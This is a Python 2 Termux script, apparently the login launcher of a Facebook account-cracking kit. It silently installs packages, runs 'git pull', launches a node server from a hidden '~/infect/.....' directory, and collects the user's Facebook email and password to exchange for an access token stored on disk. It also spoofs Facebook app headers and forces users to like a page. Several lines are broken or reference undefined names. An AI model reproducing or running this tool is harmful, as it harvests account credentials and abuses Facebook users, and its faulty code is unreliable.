#!/usr/bin/python
# coding=utf-8
# Originally Written By:jam shahrukh
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system("pip2 install lolcat")
    os.system('python2 jam.py')
os.system("clear")
"""
try:
    my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;97mTurn on mobile data\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 jam.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && npm install")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("")
    print("")
    print("")
    print("")
    print("\t\033[1;97mPlease like our page to continue")
    print("")
    print("")
    print("")
    print("")
    os.system("xdg-open https://www.facebook.com/Jam.shahrukh.official")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    print("")
    print("")
    print("")
    print("")
    print("\t\033[1;97mPlease like our page to continue")
    print("")
    print("")
    print("")
    print("")
    os.system("xdg-open https://www.facebook.com/jam.shahrukh.official")
    time.sleep(10)
    print("")
    print("")
    print("")
    print("")
    print("\t Press Allow to storage permission")
    print("")
    print("")
    print("")
    print("")
    os.system("termux setup storage")  # give storage permission
    time.sleep(5)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
#MyLogo
def logo():
    os.system('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------" | lolcat')
# titik #
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)

back = 0
id = []

def tlogin():
	global
	os.system('clear')
	logo()
	username = raw_input("[+] TOOL USERNAME: ")
	if username =="jam":
	    os.system('clear')
	    logo()
	    print "[✓] TOOL USERNAME: "+username+ " (correct)"
	else:
	    print "[!] Invalid Username."
	    time.sleep(1)
	    tlogin()
	    
	passw = raw_input("[+] TOOL PASSWORD: ")
	if passw =="muskan":
	    os.system('clear')
	    logo()
	    print "[✓] TOOL USERNAME: " +username+ " (correct)"
	    print "[✓] TOOL PASSWORD: " +passw+ "  (correct)"
	    time.sleep(2)
	else:
	    print "[!] Invalid Password."
	    time.sleep(1)
	    tlogin()
	try:
		toket = open('login.txt','r')
		os.system('python2 muskan.py')
	except (KeyError,IOError):
		methodlogin()
	else:
		print "[!] Invalid Password"
		time.sleep(1)
		tlogin()

##### Login Method #####


def methodlogin():
	os.system('clear')
	print banner
	print "[1] Login With ID/Password."
	print "[2] Login Using Token."
	print "[0] Exit."
	print ('      ')
	hos = raw_input("\nChoose Option >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		exit()
	elif hos =="1":
		login()
	elif hos =="2":
		os.system('clear')
		print banner
		hosp = raw_input("[+] Give Token : ")
		tik()
		hopa = open('login.txt','w')
		hopa.write(hosp)
		hopa.close()
		print "\n[✓] Logged In Successfully."
		time.sleep(1)
		os.system('xdg-open https://www.facebook.com/Jam.shahrukh.official')
		os.system('python2 muskan.py')
	
	elif hos =="3":
		os.system('clear')
		os.system('python2 login.py')
		
	elif hos =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
def login():
	os.system("clear")
	try:
		tb=open('login.txt', 'r')
		os.system("python2 muskan.py")
	except (KeyError,IOError):
		os.system("clear")
		print (banner)
		hamza('[!] JAM X MUSKAN BRAND')
		hamza('[!] Use a New Facebook Account To Login')
		print'-------------------------------------'
		iid=raw_input('[+] Number/Email: ')
		id=iid.replace(" ","")
		pwd=raw_input('[+] Password : ')
		tik()
		data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
		z=json.load(data)
		if 'access_token' in z:
		    st = open("login.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print "\n[✓] Logged In Successfully."
		    time.sleep(1)
		    os.system('xdg-open https://www.facebook.com/Jam.shahrukh.official')
		    os.system("clear")
		    os.system("python2 muskan.py")
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print ('[!] User Must Verify Account Before Login.')
		        time.sleep(3)
		        login()
		    else:
		        print ('[!]Number/User Id/ Password Is Wrong !')
		        time.sleep(1)
		        login()
if __name__=='__main__':
    tlogin()
